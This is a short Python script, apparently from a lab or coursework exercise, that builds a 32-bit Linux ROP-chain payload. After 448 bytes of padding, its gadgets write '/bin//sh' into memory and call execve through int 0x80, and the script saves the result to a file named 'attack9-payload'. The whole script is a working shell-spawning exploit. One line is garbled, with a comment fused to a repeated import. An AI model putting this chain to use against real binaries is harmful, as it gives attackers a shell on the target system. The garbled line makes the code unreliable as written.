from struct import pack

# Creating the padding size
p = b'A'*448

p += pack('<I', 0x0806e87b) # pop edx ; ret
p += pack('<I', 0x080da060) # @ .data
p += pack('<I', 0x080a9076) # pop eax ; ret
p += b'/bin'
p += pack('<I', 0x080572d5) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806e87b) # pop edx ; ret
p += pack('<I', 0x080da064) # @ .data + 4
p += pack('<I', 0x080a9076) # pop eax ; ret
p += b'//sh'
p += pack('<I', 0x080572d5) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806e87b) # pop edx ; ret
p += pack('<I', 0x080da068) # @ .data + 8
p += pack('<I', 0x08056890) # xor eax, eax ; ret
p += pack('<I', 0x080572d5) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080da060) # @ .data
p += pack('<I', 0x0806e8a2) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080da068) # @ .data + 8
p += pack('<I', 0x080da060) # padding without overwrite ebx
p += pack('<I', 0x0806e87b) # pop edx ; ret
p += pack('<I', 0x080da068) # @ .data + 8
p += pack('<I', 0x08056890) # xor eax, eax ; ret
p += pack('<I', 0x0807c14a) # inc eax ; ret
p += pack('<I', 0x0807c14a) # inc eax ; ret
p += pack('<I', 0x0807c14a) # inc eax ; ret
p += pack('<I', 0x0807c14a) # inc eax ; ret
p += pack('<I', 0x0807c14a) # inc eax ; ret
p += pack('<I', 0x0807c14a) # inc eax ; ret
p += pack('<I', 0x0807c14a) # inc eax ; ret
p += pack('<I', 0x0807c14a) # inc eax ; ret
p += pack('<I', 0x0807c14a) # inc eax ; ret
p += pack('<I', 0x0807c14a) # inc eax ; ret
p += pack('<I', 0x0807c14a) # inc eax ; ret
p += pack('<I', 0x08049913) # int 0x80from struct import pack


# Write into the attack9-payload file
with open("attack9-payload", "wb") as f:
    f.write(p)
